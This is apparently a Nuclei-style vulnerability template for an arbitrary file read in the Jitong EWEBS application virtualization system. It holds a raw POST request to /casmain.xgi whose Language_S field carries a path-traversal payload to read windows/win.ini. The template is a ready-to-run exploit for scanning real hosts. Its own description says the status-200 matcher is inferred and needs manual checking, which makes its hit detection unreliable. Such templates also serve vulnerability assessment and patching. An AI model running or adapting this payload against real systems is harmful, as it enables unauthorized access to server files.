id: poc-f22b6eb134746646918a
info:
  name: 极通EWEBS应用虚拟化系统casmain.xgi存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'POST /casmain.xgi HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6

    Cookie: PHPSESSID=923b86fa90ce1e14c82d4e36d1adc528; CookieLanguageName=ZH-CN

    Content-Length: 38


    Language_S=../../../../windows/win.ini'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
